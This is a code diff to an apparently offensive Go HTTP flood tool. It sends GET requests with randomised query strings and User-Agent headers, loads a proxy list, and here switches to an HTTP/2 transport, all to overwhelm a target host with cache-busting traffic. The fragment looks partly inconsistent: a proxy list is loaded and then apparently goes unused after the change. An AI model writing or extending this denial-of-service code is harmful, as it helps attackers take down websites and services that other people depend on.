@@ -16,6 +16,7 @@ import (
 
 	"github.com/corpix/uarand"
 	"github.com/gookit/color"
+	"golang.org/x/net/http2"
 )
 
 var (
@@ -52,6 +53,13 @@ func get() {
 		param_joiner = "?"
 	}
 	
+	req, err := http.NewRequest("GET", host+param_joiner+buildblock(rand.Intn(80)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+	if err != nil {
+		fmt.Println(err)
+	}
+	
+	req.Proto = "HTTP/2.0"
+
 	// Baca file proxy list
 	proxyFile, err := os.Open("proxy.txt")
 	if err != nil {
@@ -70,27 +78,15 @@ func get() {
 			continue
 		}
 		proxyURLs = append(proxyURLs, proxyURL)
-	 }
-
-	req.Proto = "HTTP/2.0"
-
-	         
-	transport := &http.Transport{
-	Proxy: http.ProxyURL(proxyURLs[rand.Intn(len(proxyURLs))]), // Use random proxy from the list
-	}
-	if transport.Proxy == nil {
-		fmt.Println("Error setting proxy for HTTP client")
-		continue
 	}
 
-    c := http.Client{
-        Timeout:   3500 * time.Millisecond,
-        Transport: transport,
-    }
+	transport := &http2.Transport{
+		AllowHTTP: true,
+	}
 
-	req, err := http.NewRequest("GET", host+param_joiner+buildblock(rand.Intn(80)+3)+"="+buildblock(rand.Intn(7)+3), nil)
-	if err != nil {
-		fmt.Println(err)
+	c := http.Client{
+		Timeout:   3500 * time.Millisecond,
+		Transport: &http2.Transport{DialTLS: transport.DialTLS},
 	}
 
 	req.Header.Set("User-Agent", uarand.GetRandom())
